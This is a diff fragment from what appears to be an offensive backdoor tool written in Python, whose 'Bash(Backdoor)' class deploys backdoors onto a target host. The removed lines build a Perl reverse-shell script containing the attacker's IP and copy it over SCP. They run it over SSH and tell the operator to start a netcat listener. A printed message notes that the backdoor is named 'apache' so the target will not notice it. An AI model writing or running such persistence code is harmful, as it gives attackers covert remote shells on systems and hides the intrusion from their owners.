@@ -35,32 +35,4 @@ class Bash(Backdoor):
         print(GOOD + "Bash Backdoor on port %s attempted. You may need to input the password, which is " + self.target.pword)
 
 
-        toW = 'perl/prsA.pl'
-        stringToAdd = ""
-        fileToWrite = open(toW, 'w')
-
-        with open ("perl/prs1", "r") as myfile:
-            data=myfile.read()
-        data = data[:-1]#remove the last new line character.
-        stringToAdd+=data + self.core.localIP
-
-        with open ("perl/prs2", "r") as myfile:
-            data=myfile.read()
-        stringToAdd+=data
-        fileToWrite.write(stringToAdd)
-        fileToWrite.close()
-
-        raw_input("Run the following command: nc -v -n -l -p %s in another shell to start the listener." % port)
-        self.target.scpFiles(self, 'perl/prsA.pl', False)
-        print("Moving the backdoor script.")
-        self.target.ssh.exec_command(self.command)
-        print("Perl backdoor on port %s attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop." % port)
-
-
-
-
-
-
-
-
 
